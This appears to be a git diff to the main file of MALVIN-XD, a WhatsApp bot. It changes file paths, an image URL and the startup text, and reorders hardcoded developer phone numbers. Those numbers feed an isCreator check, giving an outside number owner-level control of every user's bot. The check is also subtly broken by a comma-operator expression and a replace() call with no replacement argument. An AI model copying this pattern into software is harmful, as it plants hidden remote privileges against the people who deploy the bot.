@@ -24,7 +24,7 @@ const {
   
   const l = console.log
   const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
-  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
+  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./malvin/data')
   const fs = require('fs')
   const ff = require('fluent-ffmpeg')
   const P = require('pino')
@@ -65,13 +65,13 @@ const {
   setInterval(clearTempDir, 5 * 60 * 1000);
   
   //===================SESSION-AUTH============================
-if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
+if (!fs.existsSync(__dirname + '/malvin/sessions/creds.json')) {
 if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
 const sessdata = config.SESSION_ID.replace("MALVIN-XD~", '');
 const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
 filer.download((err, data) => {
 if(err) throw err
-fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
+fs.writeFile(__dirname + '/malvin/sessions/creds.json', data, () => {
 console.log("Session downloaded ✅")
 })})}
 
@@ -83,7 +83,7 @@ const port = process.env.PORT || 9090;
   
   async function connectToWA() {
   console.log("Connecting to WhatsApp ⏳️...");
-  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
+  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/malvin/sessions/')
   var { version } = await fetchLatestBaileysVersion()
   
   const conn = makeWASocket({
@@ -113,7 +113,7 @@ const port = process.env.PORT || 9090;
   console.log('Bot connected to whatsapp ✅')
   
   let up = `*Hello there MALVIN-XD User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet MALVIN XD WhatsApp Bot.\n\n *Thanks for using MALVIN-XD \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029Vac8SosLY6d7CAFndv3Z\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/kingmalvn/MALVIN-XD\n\n> © Powered BY Malvin King \ud83d\udda4`;
-    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/v1rf80.jpg` }, caption: up })
+    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/y65ffs.jpg` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)
@@ -198,7 +198,7 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const jawad = ('263780166288', '263714757857', '263780934873');
+    const jawad = ('263780934873', '263780166288', '263714757857');
     let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
@@ -296,7 +296,7 @@ if (!isReact && senderNumber === botNumber) {
    
   // take commands 
                  
-  const events = require('./command')
+  const events = require('./malvin/command')
   const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
   if (isCmd) {
   const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
@@ -768,7 +768,7 @@ if (!isReact && senderNumber === botNumber) {
   }
   
   app.get("/", (req, res) => {
-  res.send("MALVIN XD V2 STARTED ✅");
+  res.send("MALVIN XD STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
